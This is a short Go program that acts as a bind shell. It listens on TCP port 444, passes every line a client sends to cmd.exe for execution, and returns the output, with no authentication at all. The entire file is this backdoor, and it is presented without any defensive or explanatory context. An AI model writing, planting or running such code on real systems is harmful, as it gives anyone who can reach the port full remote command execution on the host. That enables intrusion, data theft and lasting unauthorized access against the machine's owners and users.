package main

import (
	"fmt"
	"net"
	"os/exec"
)

func main() {
	ln, err := net.Listen("tcp", ":444")
	buffRecv := make([]byte, 128)
	if err != nil {
		err.Error()
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		for {
			length, err := conn.Read(buffRecv)
			if err != nil {
				fmt.Println("Error: ", err)
				break
			}
			str := string(buffRecv[0 : length-1])
			out, err := exec.Command("cmd.exe", "/c", str).Output()
			if err != nil {
				fmt.Println("Error: ", err)
			} else {
				conn.Write(out)
			}
			buffRecv = make([]byte, 128)
		}
	}
}
